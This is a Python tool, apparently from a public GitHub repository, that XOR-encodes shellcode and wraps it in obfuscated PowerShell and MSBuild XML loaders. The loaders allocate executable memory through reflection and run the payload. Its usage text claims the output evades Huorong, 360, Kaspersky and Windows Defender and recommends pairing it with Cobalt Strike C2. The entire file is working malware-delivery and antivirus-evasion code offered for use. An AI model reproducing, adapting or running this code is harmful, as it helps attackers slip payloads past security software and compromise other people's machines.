# -*- coding: utf8 -*-
# https://github.com/inspiringz/python-toys

import re
import sys
import random
import string

ps1_template = '''Set-StrictMode -Version 2
function func_b {
	Param ($amodule, $aprocedure)		
	$aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Uns'+'afeN'+'ativeMethods')
	$agpa = $aunsafe_native_methods.GetMethod('GetP'+'rocAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($amodule)))), $aprocedure))
}
function func_a {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $aparameters,
		[Parameter(Position = 1)] [Type] $areturn_type = [Void]
	)
	$atype_b = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Reflect'+'edDel'+'egate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDeleg'+'ateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$atype_b.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags('Runtime, Managed')
	$atype_b.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $areturn_type, $aparameters).SetImplementationFlags('Runtime, Managed')
	return $atype_b.CreateType()
}
[Byte[]]$acode = <$$$>
for ($x = 0; $x -lt $acode.Count; $x++) {
	$acode[$x] = $acode[$x] -bxor 0xed -bxor 0xf9 -bxor 0x83 -bxor 0x45 -bxor 0x18 -bxor 0x94 -bxor 0x28 -bxor 0x9d -bxor 0xa4
}
$ava = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$abuffer = $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)
$arunme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))
$arunme.Invoke([IntPtr]::Zero)'''

xml_template = '''<?xml version="1.0" encoding="utf-8"?>

<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">  
  <Target Name="npscsharp"> 
   <nps/>
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"> 
    <Task> 
      <Reference Include="System.Management.Automation"/>  
      <Code Type="Class" Language="cs"> <![CDATA[
        using System;
        using System.Collections.ObjectModel;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class nps: Task, ITask {
          public override bool Execute() {
            byte[] some = new byte[] {
               <$$$> };
            PowerShell ps = PowerShell.Create();
            for (int i = 0; i < some.Length; ++i) {
                some[i] = (byte)(Convert.ToInt32(some[i]) ^ 0xed ^ 0xf9 ^ 0x83 ^ 0x45 ^ 0x18 ^ 0x94 ^ 0x28 ^ 0x9d ^ 0xa4);
            }
            ps.AddScript(System.Text.Encoding.Default.GetString(some));
            Collection < PSObject > output = null;
            try {
              output = ps.Invoke();
            } catch (Exception e) {
              Console.WriteLine("Error while executing the script.rn" + e.Message.ToString());
            }
            if (output != null) {
              foreach(PSObject rtnItem in output) {
                Console.WriteLine(rtnItem.ToString());
              }
            }
            return true;
          }
        }
    ]]> </Code> 
    </Task> 
  </UsingTask> 
</Project>
'''

def confuse_sc(raw_data):
    encoded_shellcode = []
    for opcode in raw_data:
        new_opcode = (((((((((ord(opcode) ^ 0xa4 ) ^ 0x9d ) ^ 0x28 ) ^ 0x94 ) ^ 0x18 ) ^ 0x45 ) ^ 0x83 ) ^ 0xf9 ) ^ 0xed )
        encoded_shellcode.append(new_opcode)

    return ",".join([str(abs(i)) for i in encoded_shellcode])

def confuse_ps1(raw_data, outf):
    random_str = lambda : ''.join(random.sample(string.ascii_letters + string.digits, 9))

    content = ps1_template.replace('<$$$>', confuse_sc(raw_data))
    vars = re.findall(r'(\$\w+) =', content)
    funcs = re.findall(r'function (\w+) {', content)

    for var in vars:
        nvar = '$' + random_str()
        content = content.replace(var, nvar)
        #print(f'[+] Change var {var} -> {nvar}')
        
    for func in funcs:
        nfunc = random_str()
        content = content.replace(func, nfunc)
        #print(f'[+] Change func {func} -> {nfunc}')
    
    content = content.replace(chr(int('0x0B', 16)), '')
    open(outf, 'w').write(content)
    #print(f'[+] Confused ps1 --> {outf}')

def confuse_xml(raw_data, outf):
    random_str = lambda : ''.join(random.sample(string.ascii_letters + string.digits, 9))

    content = ps1_template.replace('<$$$>', confuse_sc(raw_data))
    vars = re.findall(r'(\$\w+) =', content)
    funcs = re.findall(r'function (\w+) {', content)

    for var in vars:
        nvar = '$' + random_str()
        content = content.replace(var, nvar)
        
    for func in funcs:
        nfunc = random_str()
        content = content.replace(func, nfunc)

    encoded_ps1 = []
    for opcode in content:
        new_opcode = (((((((((ord(opcode) ^ 0xa4 ) ^ 0x9d ) ^ 0x28 ) ^ 0x94 ) ^ 0x18 ) ^ 0x45 ) ^ 0x83 ) ^ 0xf9 ) ^ 0xed )
        encoded_ps1.append(new_opcode)
    xor_byte_array = ",".join([hex(abs(i)) for i in encoded_ps1])

    content = xml_template.replace('<$$$>', xor_byte_array)
    content = content.replace(chr(int('0x0B', 16)), '')
    open(outf, 'w').write(content)
    #print(f'[+] Confused xml --> {outf}')

if __name__ == '__main__':
    print('\n\033[31m      ░░░░▐▐░░░  .dMMMb  .dMMMb  .aMMMb  .dMMMb\n'
        ' ▐  ░░░░░▄██▄▄  dMP" VP dMP" VP dMP"dMP dMP" VP\n'
        '  ▀▀██████▀░░   VMMMb   VMMMb  dMP dMP  VMMMb\n'   
        '  ░░▐▐░░▐▐░░  dP .dMP dP .dMP dMP.aMP dP .dMP\n'   
        ' ▒▒▒▐▐▒▒▐▐▒   VMMMP"  VMMMP"  VMMMP"  VMMMP"\033[0m\n\n'
        ' Simple ShellCode Obfuscation Script v1.0\n'
        ' https://github.com/inspiringz/python-toys @3ND\n')

    if len(sys.argv) < 3: 
        print('[+] Usage: \033[32mpython sscs.py payload.py output_filename\033[0m\n'
            '   - For ps1: powershell -ExecutionPolicy bypass -File exploit.ps1\n'
            '   - For xml: C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe exploit.xml\n\n'
            '[+] Been Test On: <2021/07/15>\n'
            '   - 火绒（版本 5.0.62.3 / 病毒库 2021-07-12）-> ps1, xml works well\n'
            '   - 360（版本 13.1.0.1002 / 备用木马库 2021-07-15）-> ps1, xml works well\n'
            '   - 卡巴斯基（版本 21.3.10.391b）-> ps1, xml works well\n'
            '   - Defender (客户端版本: 4.18.2106.6 / 引擎版本: 1.1.18300.4 / 防病毒软件版本: 1.343.1035.0) -> ps1, xml works \n\n'
            '[+] Suggest: \033[35mUse Malleable C2 Profile For CobaltStrike\033[0m\n')
        exit()
    
    try:
        buff = sys.argv[1]
        outf = sys.argv[2]
        bufc = open(buff, 'r').read()
        buf = re.findall(r'(buf = "\S+")', bufc)[0]
        exec(buf)
        confuse_ps1(buf, outf+'.ps1')
        print(f'[+] >>>> Powershell Script Generated to {outf}.ps1')
        print(f'[+] Usage: powershell -ExecutionPolicy bypass -File {outf}.ps1\n')
        confuse_xml(buf, outf+'.xml')
        print(f'[+] >>>> Xml Script Generated to {outf}.xml')
        print(f'[+] Usage: C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe {outf}.xml')
    except Exception as e:
        import traceback
        traceback.print_exc()